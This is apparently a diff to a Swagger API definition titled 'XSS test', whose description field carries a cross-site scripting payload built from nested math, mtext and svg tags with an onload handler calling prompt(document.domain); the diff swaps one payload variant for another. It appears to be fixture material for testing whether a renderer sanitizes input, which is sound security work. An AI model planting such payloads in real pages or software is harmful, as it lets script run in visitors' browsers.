@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: <math><mtext><h1><a><h6></a></h6><textarea></textarea><svg/on+load=prompt(document.domain);>”/>
+  description: <math><mtext><h1><a><h6></a></h6><textarea></textarea><svg/on<a>load=prompt(document.domain);>”/>
 
   version: production
